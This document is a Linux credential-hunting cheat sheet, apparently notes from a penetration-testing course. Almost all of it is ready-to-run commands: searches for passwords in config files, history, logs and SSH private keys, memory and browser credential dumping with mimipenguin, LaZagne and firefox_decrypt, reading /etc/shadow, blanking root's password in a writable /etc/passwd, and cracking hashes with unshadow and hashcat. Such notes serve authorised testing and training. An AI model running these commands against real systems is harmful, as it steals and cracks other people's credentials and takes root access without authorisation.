# Credential Hunting in Linux
## Files
### Configuration Files
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
### Credentials in Configuration Files
```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
## Databases
```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
## Notes
```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
## Scripts
```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
## SSH Keys
### SSH Private Keys
```
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
### SSH Public Keys
```
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
## History
### Bash History
```
tail -n5 /home/*/.bash*
```
## Logs
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
## Memory and Cache
```
https://github.com/huntergregal/mimipenguin
```
### Memory - Mimipenguin
```
sudo python3 mimipenguin.py
```
```
sudo bash mimipenguin.sh
```
```
sudo python2.7 laZagne.py all
```
## Browsers
### Firefox Stored Credentials
```
ls -l .mozilla/firefox/ | grep default
```
```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
```
python3 laZagne.py browsers
```
### Decrypting Firefox Credentials
```
https://github.com/unode/firefox_decrypt
```
```
python3.9 firefox_decrypt.py
```
# Passwd, Shadow & Opasswd
The /etc/passwd file contains information about every existing user on the system and can be read by all users and services.
It can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.
## Editing /etc/passwd - Before
```
root:x:0:0:root:/root:/bin/bash
```
## Editing /etc/passwd - After
```
root::0:0:root:/root:/bin/bash
```
## Shadow File
```
sudo cat /etc/shadow
```
If the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login.
The encrypted password also has a particular format by which we can also find out some information:
```
$<type>$<salt>$<hashed>
```
By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions
## Opasswd
The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd.
```
sudo cat /etc/security/opasswd
```
## Cracking Linux Credentials
### Unshadow
```
sudo cp /etc/passwd /tmp/passwd.bak
```
```
sudo cp /etc/shadow /tmp/shadow.bak
```
```
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
### Hashcat - Cracking Unshadowed Hashes
```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
### Hashcat - Cracking MD5 Hashes
```
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```